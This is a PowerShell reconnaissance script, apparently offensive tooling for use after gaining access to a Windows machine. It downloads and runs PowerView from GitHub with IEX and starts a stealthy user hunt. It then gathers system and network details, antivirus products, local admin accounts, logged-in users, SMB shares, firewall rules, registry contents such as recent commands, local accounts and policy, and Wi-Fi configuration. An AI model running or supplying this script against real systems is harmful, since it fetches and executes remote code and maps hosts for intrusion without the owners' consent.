# By Threats Experts University
[CmdletBinding()]
   Param
    (
        [Parameter(Position = 0)]
        [String[]]
        [ValidateSet('Chrome','IE','FireFox', 'All')]
        $Browser = 'All',

        [Parameter(Position = 1)]
        [String[]]
        [ValidateSet('History','Bookmarks','All')]
        $DataType = 'All',

        [Parameter(Position = 2)]
        [String]
        $UserName = '',

        [Parameter(Position = 3)]
        [String]
        $Search = ''
    )

    [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
    function ConvertFrom-Json20([object] $item){
        #http://stackoverflow.com/a/29689642
        Add-Type -AssemblyName System.Web.Extensions
        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        return ,$ps_js.DeserializeObject($item)
        
    }

    function Get-InternetExplorerBookmarks {
        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
        ForEach ($URL in $URLs) {
            if ($URL.FullName -match 'Favorites') {
                $User = $URL.FullName.split('\')[2]
                Get-Content -Path $URL.FullName | ForEach-Object {
                    try {
                        if ($_.StartsWith('URL')) {
                            # parse the .url body to extract the actual bookmark location
                            $URL = $_.Substring($_.IndexOf('=') + 1)

                            if($URL -match $Search) {
                                New-Object -TypeName PSObject -Property @{
                                    User = $User
                                    Browser = 'IE'
                                    DataType = 'Bookmark'
                                    Data = $URL
                                }
                            }
                        }
                    }
                    catch {
                        Write-Verbose "Error parsing url: $_"
                    }
                }
            }
        }
    }

    

    if (!$UserName) {
        $UserName = "$ENV:USERNAME"
    }

   
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-InternetExplorerBookmarks
        }
    
 $user = whoami
    $currenthost = hostname 
    $networkinfo = (Get-NetIPAddress).IPAddress
    $Publicip = (Invoke-WebRequest http://ipinfo.io/ip).content
    $org = (Get-CimInstance Win32_OperatingSystem).Organization


    Write-Output ""

    Write-Host " User: $user"
    Write-Host " Hostname: $currenthost"
    Write-Host " Public IP: " -NoNewline; Write-Host $Publicip
    write-host " Organization: $org"


    Write-Output ""

    Write-Host " [*] Getting AntiVirus ... "
    Start-Sleep -Seconds 2

     try {
    
        Get-CimInstance -Namespace root/securitycenter2 -ClassName antivirusproduct | Select-Object displayName | Format-Table -HideTableHeaders
    
        } catch{
        
        write-host "Failed To Get AntiVirus" -ForegroundColor Red

                }

    Write-Output ""

    Write-Host " [*] Getting Network IP/s ..."
    Start-Sleep -Seconds 2
   
    Write-Output ""

    $networkinfo

    Write-Output ""

     $lad = @(Get-CimInstance win32_useraccount | Select-Object name,sid)

        foreach ($l in $lad){
        
          [string]$sid = $l.sid

            if ($sid.EndsWith("500")){

            $ladstatus = (Get-CimInstance win32_useraccount | Where-Object {$_.name -like $l.name}).Disabled 

            if ($ladstatus -eq "True"){
                
                $c = "Red"
            
                } else {

                    $c = "Green"
                
                     }
            
            Write-Host " [*] Getting Local Admin ..."
            Start-Sleep -Seconds 2

            Write-Host " Local Admin Found: " -NoNewline ; Write-Host $l.name -ForegroundColor Green -NoNewline ; Write-Host " | isDisabled: " -NoNewline ; Write-Host $ladstatus -ForegroundColor $c           
            
            
          }
      
        }

         Write-Output ""

        Write-Host " [*] Getting Current Logged In Users ... "
        Start-Sleep -Seconds 2

        Write-Output ""

            query user /server:$SERVER 

        Write-Output ""

        Write-Host " [*] Getting Program Directories ... "
        Start-Sleep -Seconds 2

        $allprogs = @()
        $progs = @((get-childitem "c:\program files").Name)
        $progs32 = @((get-childitem "c:\Program Files (x86)").Name)
        $allprogs += $progs ; $allprogs += $progs32

         Write-Output ""

            foreach ($pn in $allprogs){
            
                if ($pn -notlike "*Windows*" -and $pn -notlike "*Microsoft*"){
                    
                    Write-Host $pn -ForegroundColor Green
                
                    } else {
                            
                            Write-Host $pn

                            }

            
                }

            

        Write-Output ""

        Write-Host " [*] Getting SMB Shares ... "
        Start-Sleep -Seconds 2

         Write-Output ""

            Get-SmbShare | Format-Table -HideTableHeaders

        Write-Output ""

        Write-Host " [*] Getting " -NoNewline ; Write-Host "Blocked" -ForegroundColor Red -NoNewline ; Write-Host " Firewall Rules...."

        Write-Output ""

            Get-NetFirewallRule | Where-Object Action -eq "Block" | Format-Table DisplayName,Enabled,Profile,Direction,Action,Name

        Write-Output ""

    function registry_values($regkey, $regvalue,$child) 
    { 
        if ($child -eq "no"){$key = get-item $regkey} 
        else{$key = get-childitem $regkey} 
        $key | 
        ForEach-Object { 
        $values = Get-ItemProperty $_.PSPath 
        ForEach ($value in $_.Property) 
        { 
        if ($regvalue -eq "all") {$values.$value} 
        elseif ($regvalue -eq "allname"){$value} 
        else {$values.$regvalue;break} 
        }}} 
    $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
    $output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
    $output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
    $output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
    $output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
    $output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
    $output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
    $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
    $output
